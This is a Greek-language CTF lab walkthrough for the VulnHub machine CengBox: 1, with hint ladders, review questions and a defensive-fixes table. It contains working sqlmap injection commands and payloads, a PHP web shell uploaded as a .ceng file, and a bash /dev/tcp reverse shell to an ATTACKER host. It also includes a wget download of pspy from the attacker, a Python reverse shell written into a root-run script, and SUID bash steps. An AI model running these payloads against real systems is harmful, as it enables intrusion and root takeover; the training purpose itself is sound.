# Μηχάνημα 9 — CengBox: 1

> **Θέση:** 9 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **018** από 708)
> **Πλήρες walkthrough:** [`labs/3-018-cengbox-1/README.md`](../../labs/3-018-cengbox-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | CengBox: 1 |
| **Δημιουργός** | Cengiz (Anon) |
| **Κυκλοφορία** | 2020 |
| **Σύμβαση** | **`user.txt`** + **`root.txt`** |
| **Στόχος** | Ubuntu 18.04 — Apache 2.4.29, PHP, MySQL, OpenSSH 7.6p1 |
| **VulnHub** | [entry/cengbox-1,522](https://vulnhub.com/entry/cengbox-1,522/) |
| **Εκτιμώμενος χρόνος** | 5–6 ώρες |

---

## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή είναι **το πιο ολοκληρωμένο μηχάνημα της διαδρομής** — και **το πιο κοντινό σε
πραγματικό pentest**.

Έχει **τρεις πλήρεις φάσεις**, καθεμία με διαφορετική τεχνική:

1. **SQL injection** με **τρεις** ανεξάρτητες τεχνικές (boolean-blind, time-blind, UNION) στην
   **ίδια** παράμετρο — και **σχηματική ανάγνωση**, όχι μόνο γραμμές.
2. **Upload με προσαρμοσμένη επέκταση** — ένα φίλτρο που λέει «μόνο `.ceng`» **ενώ το `.ceng`
   χαρτογραφείται στον PHP handler**. **Αυτό είναι το δίδαγμα: το φίλτρο δεν απέτυχε· η
   ρύθμιση απέτυχε.**
3. **Ανάβαση μέσω προγραμματισμένης εργασίας** — **`/opt/md5check.py` mode 777, εκτελείται ως
   root κάθε 5 δευτερόλεπτα**. Και η **ειρωνεία είναι τέλεια**: το σενάριο που **ανιχνεύει
   παραβίαση** είναι **ο ίδιος ο φορέας παραβίασης**.

Επιπλέον, εισάγει **δύο εργαλεία που δεν εμφανίζονται πουθενά αλλού**:

- **`sqlmap`** — με **κάθε flag να είναι απόφαση**, όχι τύχη.
- **`pspy`** — **βλέπει διεργασίες που το `ps` χάνει**, **χωρίς root**.

Και σας δίνει **τρεις διαφορετικά payloads αναβάθμισης** — reverse shell, sudo drop-in, SUID
bash — **και σας ζητάει να διαλέξετε με κριτήρια**, όχι με προτίμηση.

## Στόχοι μάθησης

1. Να **κλιμακώσετε λεξικά** content discovery και να καταλάβετε **γιατί** το `common.txt`
   αποτυγχάνει.
2. Να χρησιμοποιήσετε **`-X .php`** για να βρείτε **την πραγματική επιφάνεια** μιας εφαρμογής PHP.
3. Να **καταγράψετε τις χειροκίνητες αποτυχίες ΠΡΙΝ** τρέξετε `sqlmap`.
4. Να **διαβάσετε τα flags του `sqlmap`** ως **αποφάσεις κινδύνου**, όχι ως μαγεία.
5. Να **διαβάσετε το σχήμα** (`varchar(64)`, **χωρίς** `$2y$`) και όχι μόνο τις γραμμές.
6. Να **καταλάβετε γιατί ένα φίλτρο επέκτασης αποτυγχάνει** όταν η επέκταση **χαρτογραφείται
   στον interpreter**.
7. Να χρησιμοποιήσετε **`pspy`** για να βρείτε **χρονοπρογραμματισμένες εργασίες εκτός cron**.
8. Να **διαλέξετε ανάμεσα σε τρία payloads αναβάθμισης** με **κριτήρια**.
9. Να **επαναφέρετε** ό,τι αλλάξατε.

## Κατηγορίες επίθεσης που καλύπτονται

| Κατηγορία | Πού σε αυτό το μηχάνημα |
| --- | --- |
| **Κλιμάκωση λεξικού** | `common.txt` (4.612) → **`big.txt`** (20.469) → βρίσκει `/masteradmin/` |
| **Σάρωση με επεκτάσεις** | `dirb … -X .php` → `login.php` (200), `upload.php`/`adb.php` (302) |
| **SQL injection — 3 τεχνικές** | **boolean-blind**, **time-blind (`SLEEP`)**, **UNION (3 στήλες)** |
| **Παράκαμψη με `--forms`** | Το sqlmap **διαβάζει τη φόρμα** αντί να γράφετε raw request |
| **Κωδικοί σε καθαρό κείμενο** | `users.password varchar(64)` → **`masteradmin : C3ng0v3R00T1!`** |
| **Upload με προσαρμοσμένη επέκταση** | Μόνο **`.ceng`** επιτρέπεται — **και εκτελείται ως PHP** |
| **Επανάχρηση διαπιστευτηρίων** | Ο κωδικός της **βάσης** δουλεύει και στο **σύστημα** (`su cengover`) |
| **Ομάδα ισοδύναμη με root** | **`groups=…,110(lxd)`** |
| **Χρονοπρογραμματισμένη εργασία** | **`/opt/md5check.py`** mode **777**, **UID=0**, κάθε **5 δευτερόλεπτα** |
| **Ανίχνευση με `pspy`** | **`inotify` στο `/proc`** — χωρίς root |

## Διαβάστε πρώτα

- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) — **§3** (SQL injection: **και οι τρεις
  τεχνικές**), **§7** (content discovery και **κλιμάκωση λεξικών**), **§8** (upload filters).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) — **§5**
  (χρονοπρογραμματισμένες εργασίες) και **§6** (`lxd`).
- [06 — Κελύφη, Εμμονή και Διαφυγές](<../06-Κελύφη-Εμμονή-και-Διαφυγές.md>) — **§1** (URL
  encoding) και **§3** (TTY).
- Αγγλική έκδοση:
  [Machine 9](<../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/09-cengbox-1.md>)

## Πριν ξεκινήσετε — απαντήστε

1. Γιατί το **`common.txt`** αποτυγχάνει να βρει το **`/masteradmin/`**;
2. Ποια η διαφορά **boolean-blind**, **time-blind**, και **UNION** injection;
3. Αν το `sqlmap` αναφέρει **τρεις** τεχνικές στην **ίδια** παράμετρο, τι σας λέει αυτό;
4. Γιατί το **`-p username`** στις επόμενες εκτελέσεις **γλιτώνει χρόνο**;
5. Αν μια εργασία τρέχει ως root κάθε 5 δευτερόλεπτα **και δεν είναι στο cron**, πού είναι;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

**Μόνο δύο θύρες: 22 και 80.** **Ολόκληρη η επίθεση είναι μέσα στην εφαρμογή web.**

Το **`robots.txt` επιστρέφει 404** — **τίποτα δεν διαρρέει**. **Άρα πρέπει να σαρώσετε.**

**Και το `dirb` με `common.txt` βρίσκει ΜΟΝΟ το `/uploads/`.**

**Σταματήστε και σκεφτείτε:** *ένας κατάλογος `/uploads/` ΧΩΡΙΣ εφαρμογή για να ανεβάσετε
ΑΠΟ ΠΟΥ σημαίνει ότι η εικόνα είναι ημιτελής — κάτι κρύβεται.*
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -A -p- TARGET               → 22 (OpenSSH 7.6p1), 80 (Apache 2.4.29)
 2. curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/robots.txt   → 404
 3. dirb http://TARGET/ /usr/share/dirb/wordlists/common.txt            → /uploads/ ΜΟΝΟ
 4. dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt               → + /masteradmin/
 5. dirb http://TARGET/masteradmin/ big.txt -X .php
    → login.php (200|1194) · adb.php (302|0) · upload.php (302|0)
 6. Χειροκίνητες δοκιμές: admin/admin, masteradmin/masteradmin, ' OR 1=1-- -
    → ΟΛΕΣ «Invalid credentials»
 7. sqlmap -u "…/login.php" --forms --batch --level 3 --risk 2
    → username: boolean-blind + time-blind + UNION (3 στήλες)
 8. sqlmap … --dbs → cengbox
    sqlmap … -D cengbox --tables → uploads, users, config
    sqlmap … -T users --dump → masteradmin | C3ng0v3R00T1!   (ΚΑΘΑΡΟ ΚΕΙΜΕΝΟ)
 9. Σύνδεση στο /masteradmin/login.php
10. upload.php: μόνο .ceng → <?php system($_GET['cmd']); ?> ως shell.ceng
11. curl "http://TARGET/uploads/shell.ceng?cmd=id" → www-data
12. nc -lvnp 4444 + URL-encoded bash -i >& /dev/tcp/…
13. python3 -c 'import pty; pty.spawn("/bin/bash")' + stty raw -echo; fg
14. cat /etc/passwd | grep -E ':(1000|1001):' → cengover
15. su cengover (με C3ng0v3R00T1!) → id → groups=1000(cengover),110(lxd)
16. crontab -l; cat /etc/crontab → ΤΙΠΟΤΑ
17. ./pspy64 → UID=0 | /usr/bin/python /opt/md5check.py  (κάθε 5s)
18. ls -l /opt/md5check.py → -rwxrwxrwx (777!)
19. Αντικατάσταση σεναρίου → root
20. ΕΠΑΝΑΦΟΡΑ του σεναρίου
```
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — η κλιμάκωση λεξικών</strong></summary>

**Αυτή είναι η πρόοδος που αξίζει να απομνημονεύσετε:**

| Λεξικό | Εγγραφές | Πότε |
| --- | --- | --- |
| **`dirb/common.txt`** | 4.612 | **Πρώτη προσπάθεια** — γρήγορη |
| **`dirb/big.txt`** | 20.469 | **Όταν το common αποτύχει** ← **εδώ** |
| **`directory-list-2.3-medium.txt`** | ~220.000 | Όταν θέλετε βάθος |
| **`SecLists/…/directory-list-2.3-big.txt`** | ~1,3 εκατ. | Μεγάλα συστήματα |
| **`raft-large-directories.txt`** | ~40.000 | Εναλλακτικό |

**`common.txt` (4.612) έχασε το `/masteradmin`· `big.txt` (20.469) το βρήκε.**

**Αυτό είναι το δίδαγμα της φάσης 1: το `common.txt` ΔΕΝ αρκεί.**

**Και ο κανόνας:** *κλιμακώστε ΠΡΙΝ συμπεράνετε ότι ένα μηχάνημα είναι άδειο.* Ένα **404** δεν
σημαίνει «δεν υπάρχει» — σημαίνει «**δεν μάντεψα το όνομα**».

**Μετά, ξανασαρώστε τον ΝΕΟ κατάλογο ΜΕ ΕΠΕΚΤΑΣΕΙΣ:**

```bash
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/big.txt -X .php
```

**`-X .php`** = **προσάρτησε την επέκταση σε ΚΑΘΕ εγγραφή του λεξικού** (ισοδύναμο με
**`gobuster -x php`**).

**Οι εφαρμογές PHP κρύβουν την πραγματική τους επιφάνεια πίσω από αρχεία `.php` που μια απλή
σάρωση καταλόγων ΔΕΝ μαντεύει ποτέ.**

**Διαβάστε τα τρία αποτελέσματα:**

| Αποτέλεσμα | Κωδικός | Μέγεθος | Τι σημαίνει |
| --- | --- | --- | --- |
| **`login.php`** | **200** | **1194** | **Η injectable φόρμα** |
| **`adb.php`** | **302** | **0** | **Ανακατεύθυνση — δεν είστε πιστοποιημένοι** |
| **`upload.php`** | **302** | **0** | **Ανακατεύθυνση — αλλά η ΥΠΑΡΞΗ του είναι γνωστή** |

**Ένα `302` με `SIZE:0` ΔΕΝ είναι αποτυχία.** **Είναι πληροφορία:** *αυτό το αρχείο υπάρχει,
αλλά απαιτεί session.* **Και το `upload.php` είναι ο τελικός σας στόχος.**
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — οι τρεις τεχνικές injection</strong></summary>

```bash
sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
```

**Κάθε flag είναι ΑΠΟΦΑΣΗ:**

| Flag | Σημασία |
| --- | --- |
| **`--forms`** | **Φέρε τη σελίδα, διάβασε το `<form>`, δοκίμασε κάθε πεδίο** — γλιτώνει το γράψιμο raw request |
| **`--batch`** | **Ποτέ μην ρωτάς· πάρε την προεπιλεγμένη απάντηση.** **Απαραίτητο για σεναριοποιημένες εκτελέσεις** |
| **`--level 3`** | **Δοκίμασε ΚΑΙ `User-Agent`, `Referer`, cookies** (τα 4–5 προσθέτουν και άλλα headers) |
| **`--risk 2`** | **Πόσο ΕΠΙΚΙΝΔΥΝΑ μπορεί να είναι τα payloads.** **Το risk 3 προσθέτει time-based και βαριά `OR` tests που ΜΠΟΡΟΥΝ ΝΑ ΑΛΛΑΞΟΥΝ ΔΕΔΟΜΕΝΑ — πάρτε έγγραφη άδεια πριν το risk 3 σε σύστημα πελάτη** |

**Οι τρεις τεχνικές:**

| Τεχνική | Payload | Πώς την αναγνωρίζετε |
| --- | --- | --- |
| **boolean-blind** | `username=admin' AND 1=1-- -` | **Η σελίδα διαφέρει** ανάμεσα σε `1=1` και `1=2` |
| **time-blind** | `username=admin' AND SLEEP(5)-- -` | **Η απάντηση καθυστερεί 5 δευτερόλεπτα** |
| **UNION query** | `username=admin' UNION ALL SELECT NULL,NULL,CONCAT(0x71706a7871,…)-- -` | **Τα δεδομένα εμφανίζονται ΜΕΣΑ στη σελίδα** |

**Και οι τρεις βρέθηκαν στην ΙΔΙΑ παράμετρο (`username`).** **Όταν ένα εργαλείο αναφέρει τρεις
ανεξάρτητες τεχνικές σε ένα πεδίο, το injection είναι ΠΡΑΓΜΑΤΙΚΟ και ΒΑΘΥ.**

**Το `CONCAT(0x71706a7871,…,0x71626b6271)` είναι το κόλπο του marker:** το **`0x71…`** είναι
**hex για `qpjxq`**, άρα το sqlmap **τυλίγει** την έξοδό του σε **μοναδική συμβολοσειρά** που
**μπορεί να ξαναβρεί** στην απάντηση. **Έτσι λειτουργεί η εξαγωγή UNION πάνω από μια σελίδα
της οποίας τη δομή δεν μπορείτε να προβλέψετε.**
</details>

<details>
<summary><strong>Σκαλοπάτι 5 — η απάντηση</strong></summary>

```bash
sudo nmap -A -p- -T4 -oN scans/cengbox.txt TARGET
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/big.txt -X .php

sqlmap -u "http://TARGET/masteradmin/login.php" --forms --batch --level 3 --risk 2
sqlmap -u "http://TARGET/masteradmin/login.php" --data="username=a&password=b" \
       -p username --batch --dbs
sqlmap -u "…" --data="username=a&password=b" -p username --batch -D cengbox --tables
sqlmap -u "…" --data="username=a&password=b" -p username --batch -D cengbox -T users --dump
# → masteradmin | C3ng0v3R00T1!

# Upload
cat > shell.ceng <<'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -s -b cookies.txt -F "file=@shell.ceng" http://TARGET/masteradmin/upload.php
curl -s "http://TARGET/uploads/shell.ceng?cmd=id"

# Reverse shell
nc -lvnp 4444
curl -s "http://TARGET/uploads/shell.ceng?cmd=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Πλαγινή κίνηση
su cengover                     # κωδικός: C3ng0v3R00T1!
id                              # → groups=1000(cengover),110(lxd)

# Ανακάλυψη χρονοπρογραμματισμένης εργασίας
wget http://ATTACKER:8000/pspy64 && chmod +x pspy64 && ./pspy64
ls -l /opt/md5check.py          # → -rwxrwxrwx (777)

# Payload A — reverse shell
cp /opt/md5check.py /tmp/md5check.py.bak
cat > /opt/md5check.py <<'EOF'
import socket, os, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
EOF
# περιμένετε 5 δευτερόλεπτα → root
cat /root/root.txt
cp /tmp/md5check.py.bak /opt/md5check.py      # ΕΠΑΝΑΦΟΡΑ
```
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Διαβάστε το <code>password varchar(64)</code> χωρίς πρόθεμα <code>$2y$</code>.</b></summary>

**Σημαίνει: ο κωδικός αποθηκεύεται σε ΚΑΘΑΡΟ ΚΕΙΜΕΝΟ.** **Αυτό είναι εύρημα επιπέδου
αναφοράς**, γιατί **οποιοσδήποτε** με injection, backup, ή ανάγνωση του σχήματος **παίρνει
ΚΑΘΕ διαχειριστή αμέσως**.

**Η σωστή αποθήκευση:**

```php
$hash = password_hash($pw, PASSWORD_ARGON2ID);
// έλεγχος:
if (password_verify($input, $hash)) { … }
```

**Οι μορφές που πρέπει να αναγνωρίζετε:**

| Πρόθεμα | Αλγόριθμος |
| --- | --- |
| **`$2y$`** | **bcrypt** (PHP) |
| **`$argon2id$`** | **Argon2id** (η σύγχρονη προεπιλογή) |
| **`$6$`** | **SHA-512 crypt** (Linux `/etc/shadow`) |
| **`$S$`** / **`$P$`** / **`$H$`** | **phpass** (Drupal / WordPress) |
| **`$y$`** | **yescrypt** (σύγχρονο Debian — Μηχάνημα 8) |
| **32 hex, κανένα πρόθεμα** | **unsalted MD5** (Μηχάνημα 7) |
| **Τίποτα από τα παραπάνω** | **ΚΑΘΑΡΟ ΚΕΙΜΕΝΟ** ← **εδώ** |

**Και το δεύτερο δίδαγμα: ο πίνακας `uploads` κρατά ήδη δύο αρχεία `.ceng`.** **Αυτή η επέκταση
είναι η υπόδειξη για την επόμενη φάση.**
</details>

<details>
<summary><b>2.</b> Γιατί το φίλτρο <code>.ceng</code> απέτυχε;</b></summary>

**Δεν απέτυχε το φίλτρο — απέτυχε η ΡΥΘΜΙΣΗ.**

Το φίλτρο κάνει **ακριβώς** αυτό που του ζητήθηκε: **απορρίπτει οτιδήποτε δεν είναι `.ceng`**.
**Αλλά** η εφαρμογή **χαρτογραφεί το `.ceng` στον PHP handler** (στον Apache:
`AddHandler application/x-httpd-php .ceng` ή `AddType`).

**Άρα:**

```text
Φίλτρο:  «Μόνο έγγραφα .ceng»     ← σωστά εφαρμοσμένο
Apache:  «Το .ceng είναι PHP»     ← λάθος ρύθμιση
Αποτέλεσμα: remote code execution
```

**Αυτό είναι το δίδαγμα: μια blacklist είναι τόσο ισχυρή όσο η ΡΥΘΜΙΣΗ γύρω της.**

**Κάθε άμυνα upload έχει μια τυπική παράκαμψη:**

| Άμυνα | Παράκαμψη |
| --- | --- |
| **Blacklist επεκτάσεων** | `.phtml`, `.php5`, `.php7`, `.pht`, `.phar`, **κεφαλαία** (`.PHP`), `.php.jpg`, **null byte** σε παλιά PHP |
| **Έλεγχος MIME type** | **Το header είναι ΕΛΕΓΧΟΜΕΝΟ ΑΠΟ ΤΟΝ ΠΕΛΑΤΗ και ΑΝΟΗΤΟ** — αλλάξτε το στο Burp |
| **`getimagesize()`** | **Προσθέστε πραγματικά image bytes** πριν το PHP → **polyglot** |
| **Whitelist επεκτάσεων** | **Ισχυρή** — **αλλά άχρηστη αν η επέκταση χαρτογραφείται στον interpreter** |

**Εδώ δεν χρειάστηκε ΚΑΜΙΑ από αυτές** — **γιατί η προσαρμοσμένη επέκταση ήταν ήδη
χαρτογραφημένη στον interpreter.**
</details>

<details>
<summary><b>3.</b> Γιατί το <code>pspy</code> βρίσκει πράγματα που το <code>ps</code> χάνει;</b></summary>

Επειδή το **`ps`** και το **`/proc`** δείχνουν **μόνο ό,τι τρέχει ΤΩΡΑ**. **Μια εργασία που
πυροδοτεί κάθε λίγα δευτερόλεπτα είναι εύκολο να χαθεί ανάμεσα σε δύο ματιές.**

**Το `pspy`:**
- **Δεν χρειάζεται root**
- **Παρακολουθεί γεγονότα `inotify` στο `/proc`**
- **Καταγράφει ΚΑΘΕ εκκίνηση και έξοδο διεργασίας** με **πλήρη γραμμή εντολής** και **το UID
  που την εκτέλεσε**

**Διαβάστε κάθε γραμμή:**

```text
2024-05-04 19:02:11 CMD: UID=0     PID=1842   | /usr/bin/python /opt/md5check.py
```

| Πεδίο | Σημασία |
| --- | --- |
| **`UID=0`** | **Ο ενεργός χρήστης που την ξεκίνησε — 0 = root** |
| **`PID=1842`** | **Το αναγνωριστικό διεργασίας** |
| **`| /usr/bin/python /opt/md5check.py`** | **Η ΠΛΗΡΗΣ γραμμή εντολής** |

**Οι επαναλαμβανόμενοι χρόνοι ΑΝΑ 5 ΔΕΥΤΕΡΟΛΕΠΤΑ αποδεικνύουν ότι είναι χρονοπρογραμματισμένη
εργασία** — **και ΔΕΝ είναι στο cron**, άρα είναι **systemd timer** ή **βρόχος
`while true; sleep 5`**.

**Το `pspy` δεν ενδιαφέρεται ΠΩΣ προγραμματίστηκε· απλώς αναφέρει ότι ΤΡΕΧΕΙ.**
</details>

<details>
<summary><b>4.</b> Διαλέξτε ανάμεσα στα τρία payloads — με κριτήρια.</b></summary>

| | **A — Reverse shell** | **B — sudo drop-in** | **C — SUID bash** |
| --- | --- | --- | --- |
| **Άμεσο;** | **Ναι** | Όχι — χρειάζεται νέο κέλυφος | Όχι — χρειάζεται `/tmp/rb -p` |
| **Επιζεί αποσύνδεσης;** | **Όχι** | **Ναι** | **Ναι** |
| **Χρειάζεται egress;** | **Ναι** | Όχι | Όχι |
| **Ανιχνεύσιμο;** | **Υψηλά** (νέα σύνδεση) | Μέτρια (`sudoers.d`) | **Υψηλά** (νέο SUID binary) |
| **Κατάλληλο για** | **Γρήγορη απόδειξη** | **Μόνιμη πρόσβαση** | **Εμμονή** |
| **Απαιτεί TTY;** | Όχι | **Ναι** | Όχι |

**Σε πραγματικό έργο:** **Β** (sudo drop-in) είναι **η πιο χρήσιμη** — **επιζεί**, **δεν
χρειάζεται egress**, και **δίνει επαναλαμβανόμενη πρόσβαση**. **Αλλά** είναι **η πιο
παραβιαστική** — **αλλάζει διαμόρφωση συστήματος**.

**Σε CTF:** **Α** είναι **η πιο γρήγορη**.

**Και σε όλες τις περιπτώσεις: `cp` αντίγραφο ΠΡΙΝ.**

**Προτιμήστε ένα `/etc/sudoers.d/` drop-in από το να προσθέσετε στο `/etc/sudoers`:** ένα
**συντακτικό σφάλμα** στο `/etc/sudoers` **κλειδώνει ΟΛΟΥΣ έξω από το sudo** (γι' αυτό
υπάρχει το **`visudo`** — **επικυρώνει πριν αποθηκεύσει**), ενώ **ένα κακό drop-in
επηρεάζει μόνο τον εαυτό του**. **Το `chmod 440` είναι υποχρεωτικό** — το sudo **αγνοεί**
αρχεία με χαλαρά δικαιώματα.
</details>

<details>
<summary><b>5.</b> Γιατί το <code>-p</code> είναι ΥΠΟΧΡΕΩΤΙΚΟ στο SUID bash;</b></summary>

Επειδή το **bash ΡΙΧΝΕΙ σκόπιμα το ενεργό UID στην εκκίνηση** — **εκτός αν κληθεί με `-p`**
(**«privileged»**). **Αυτή είναι ρητή προστασία ΑΚΡΙΒΩΣ ενάντια σε αυτή την επίθεση.**

```bash
cp /bin/bash /tmp/rb && chown root:root /tmp/rb && chmod 4755 /tmp/rb
/tmp/rb        # → $ prompt, uid=1000      ← ΤΟ -p ΛΕΙΠΕΙ
/tmp/rb -p     # → # prompt, euid=0        ← ΣΩΣΤΟ
```

**Το να ξεχάσετε το `-p` και να πάρετε `$` αντί για `#` είναι η κλασική σύγχυση.**

**`chmod 4755`** — το **αρχικό `4`** είναι το **SUID bit**, που παράγει
**`-rwsr-xr-x root root`**: **όποιος το εκτελεί, τρέχει με την ταυτότητα του ΙΔΙΟΚΤΗΤΗ**.

**Διαβάστε το `id` ως *SUID αναβάθμιση, όχι σύνδεση*:**

```text
uid=1000(cengover) gid=1000(cengover) euid=0(root) egid=0(root) groups=1000(cengover),110(lxd)
```

**Το πραγματικό UID παραμένει `1000(cengover)`, το ΕΝΕΡΓΟ γίνεται `0`** — **και οι έλεγχοι
δικαιωμάτων χρησιμοποιούν το ενεργό.**
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **SQL injection στο `login.php`** | **Prepared statements** (`PDO` με bound parameters). **Ποτέ** string concatenation σε SQL |
| **Κωδικοί σε καθαρό κείμενο** | **`password_hash($pw, PASSWORD_ARGON2ID)`** + **`password_verify()`** |
| **`.ceng` χαρτογραφημένο στον PHP handler** | **Αφαίρεση** του `AddHandler`. **Μόνο `.php` στον handler** |
| **`upload.php` χωρίς έλεγχο περιεχομένου** | **Whitelist επεκτάσεων** + **έλεγχος magic bytes** + **αποθήκευση ΕΚΤΟΣ web root** + **`Content-Disposition: attachment`** |
| **Επανάχρηση διαπιστευτηρίων βάσης/συστήματος** | **Ποτέ** ο ίδιος κωδικός σε δύο συστήματα |
| **Ομάδα `lxd`** | **Ισοδύναμη με root.** Αφαιρέστε όσους δεν τη χρειάζονται |
| **`/opt/md5check.py` mode 777** | **`chmod 755`** + **`chown root:root`**. **Αυτό είναι ΟΛΟΚΛΗΡΗ η αναβάθμιση** |
| **Χωρίς έλεγχο ακεραιότητας σεναρίων** | **AIDE / Tripwire** με **baseline** σε **μόνο-για-ανάγνωση** τοποθεσία |
| **Εργασία εκτός cron** | **Καταγράψτε ΟΛΕΣ τις χρονοπρογραμματισμένες εργασίες** (cron, systemd timers, `/etc/init.d`, `rc.local`) |

**Το μεγαλύτερο δίδαγμα:** *μια προγραμματισμένη εργασία είναι ασφαλής ΜΟΝΟ αν*
1. **το σενάριο ΔΕΝ είναι εγγράψιμο από χρήστες με χαμηλότερα προνόμια,**
2. **δεν εκτελεί ποτέ τίποτα από world-writable τοποθεσία,** και
3. **χρησιμοποιεί απόλυτες διαδρομές παντού.**

**Ο Κανόνας 1 σπάει εδώ — και η ειρωνεία είναι τέλεια: η δουλειά του σεναρίου είναι να
ΑΝΙΧΝΕΥΕΙ παραβίαση, και είναι το ίδιο ο φορέας παραβίασης.**

---

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

`TARGET` = **192.168.56.106**, `ATTACKER` = **192.168.56.10**.

### 1. Σάρωση

```bash
sudo nmap -A -p- -T4 -oN scans/cengbox.txt TARGET
```

```text
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4c:4f:4a:6c:2e:0d:8f:1c:2f:9a:6e:4b:2c:1a:3d:5e (RSA)
|   256 aa:5c:4b:3c:3d:3e:6b:3a:6c:1e:14:9b:0a:1c:2d:3e (ECDSA)
|_  256 c0:3a:3a:3b:3c:3d:3e:3f:40:41:42:43:44:45:46:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: CengBox
|_http-server-header: Apache/2.4.29 (Ubuntu)
OS details: Linux 4.15 - 5.5
```

**`-A`** είναι **συντομογραφία** για **`-sV -sC -O --traceroute`** — **εκδόσεις, προεπιλεγμένα
scripts, ανίχνευση OS, και διαδρομή**, όλα μαζί.

**`OpenSSH 7.6p1 Ubuntu 4ubuntu0.3`** μαζί με **`Apache 2.4.29 ((Ubuntu))`** καρφιτσώνει
**Ubuntu 18.04**.

**Δύο θύρες, άρα ολόκληρη η επίθεση είναι μέσα στην εφαρμογή web.**

### 2. Content discovery — και γιατί η μικρή λίστα αποτυγχάνει

```bash
curl -s http://TARGET/ | head -30
curl -s -o /dev/null -w '%{http_code}\n' http://TARGET/robots.txt
dirb http://TARGET/ /usr/share/dirb/wordlists/common.txt
```

```text
404
```
```text
-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat May  4 18:02:11 2024
URL_BASE: http://192.168.56.106/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.56.106/ ----
==> DIRECTORY: http://192.168.56.106/uploads/

-----------------
END_TIME: Sat May  4 18:03:44 2024
DOWNLOADED: 4612 - FOUND: 1
```

**Το `robots.txt` επιστρέφει `404`** — **τίποτα δεν διαρρέει**.

**`-o /dev/null -w '%{http_code}'`** τυπώνει **μόνο τον κωδικό κατάστασης** — **ο γρήγορος
τρόπος να ελέγξετε αν ένα αρχείο υπάρχει χωρίς να διαβάσετε το body**.

**Το dirb βρήκε έναν κατάλογο: `/uploads/`.**

**Σταματήστε και σκεφτείτε σχετικά με αυτό.** *Ένας κατάλογος `/uploads/` ΧΩΡΙΣ εφαρμογή για να
ανεβάσετε ΑΠΟ ΠΟΥ σημαίνει ότι η εικόνα είναι ημιτελής — κάτι κρύβεται.*

**Κλιμακώστε το λεξικό:**

```bash
dirb http://TARGET/ /usr/share/dirb/wordlists/big.txt
```

```text
GENERATED WORDS: 20469

---- Scanning URL: http://192.168.56.106/ ----
==> DIRECTORY: http://192.168.56.106/masteradmin/
==> DIRECTORY: http://192.168.56.106/uploads/

DOWNLOADED: 20469 - FOUND: 2
```

**`common.txt` (4.612 εγγραφές) έχασε το `/masteradmin`· `big.txt` (20.469) το βρήκε.**

### 3. Ξανασάρωση του νέου καταλόγου *με επεκτάσεις*

```bash
dirb http://TARGET/masteradmin/ /usr/share/dirb/wordlists/big.txt -X .php
```

```text
---- Scanning URL: http://192.168.56.106/masteradmin/ ----
+ http://192.168.56.106/masteradmin/login.php (CODE:200|SIZE:1194)
+ http://192.168.56.106/masteradmin/adb.php (CODE:302|SIZE:0)
+ http://192.168.56.106/masteradmin/upload.php (CODE:302|SIZE:0)

DOWNLOADED: 20469 - FOUND: 3
```

**`-X .php`** = **προσαρτά την επέκταση σε ΚΑΘΕ εγγραφή του λεξικού** (ισοδύναμο με
**`gobuster -x php`**).

**Οι εφαρμογές PHP κρύβουν την πραγματική τους επιφάνεια πίσω από αρχεία `.php` που μια απλή
σάρωση καταλόγων δεν μαντεύει ποτέ.**

**Διαβάστε τα τρία αποτελέσματα:**

| Αρχείο | Κωδικός | Μέγεθος | Ερμηνεία |
| --- | --- | --- | --- |
| **`login.php`** | **200** | **1194** | **Η injectable φόρμα** |
| **`upload.php`** | **302** | **0** | **Ανακατεύθυνση — δεν είστε πιστοποιημένοι, αλλά η ΥΠΑΡΞΗ είναι γνωστή** |
| **`adb.php`** | **302** | **0** | **Ίδιο — το admin backend** |

**Το `upload.php` είναι ο τελικός σας στόχος.**

### 4. Καταγράψτε τις χειροκίνητες αποτυχίες ΠΡΩΤΑ

| Username | Password | Αποτέλεσμα |
| --- | --- | --- |
| **`admin`** | **`admin`** | «Invalid credentials» |
| **`masteradmin`** | **`masteradmin`** | «Invalid credentials» |
| **`' OR 1=1-- -`** | **`x`** | «Invalid credentials» |

**Το να δοκιμάσετε τα προφανή χειροκίνητα παίρνει ένα λεπτό και σας λέει ότι η φόρμα δεν
παρακάμπτεται τετριμμένα** — άρα **το injection είναι πιο λεπτό από το `' OR 1=1--`**.

